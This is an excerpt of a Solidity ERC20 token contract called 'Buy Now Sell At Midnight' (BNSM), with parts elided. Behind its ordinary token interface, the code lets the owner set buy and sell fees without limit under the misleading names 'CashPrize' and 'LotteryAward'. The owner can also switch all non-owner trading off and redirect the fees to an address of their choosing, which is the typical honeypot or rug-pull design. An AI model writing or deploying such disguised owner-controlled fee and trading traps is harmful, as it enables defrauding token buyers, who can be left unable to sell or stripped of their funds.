...
contract BNSM is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    uint256 private _totalSupply = 100000000 * 10 ** 18;
    string private _name = "Buy Now Sell At Midnight";
    string private _symbol = "BNSM";
    uint8 private _decimals = 18;
    uint256 private CashPrize = 1;
    uint256 private LotteryAward = 2;
    address public rewardAddress = 0xf10cEcDEDf23F4c762bdfB705b168e7fe0a9e2FF;
    ...
    function _transfer(address _from, address _to, uint256 _amount) internal {
        ...
        require(isTradingEnabled || _to == owner() || _from == owner(), "Trading is disabled");
        ...
        if (takeFee) {
            uint256 feePercent = automatedMarketMakerPairs[_to] ? LotteryAward : CashPrize;
    ...
    function setRewardAddress(address _rewardAddress) public onlyOwner {
        excludeFromFees(rewardAddress, false);
        rewardAddress = _rewardAddress;
        excludeFromFees(rewardAddress, true);
    }

    function enableCashPrize(uint256 _CashPrize) public onlyOwner {
        CashPrize = _CashPrize;
    }

    function enableLotteryAward(uint256 _LotteryAward) public onlyOwner {
    ...
    function openTrade() public onlyOwner {
        if (isTradingEnabled == true) {isTradingEnabled = false;}
        else {isTradingEnabled = true;}
    }
}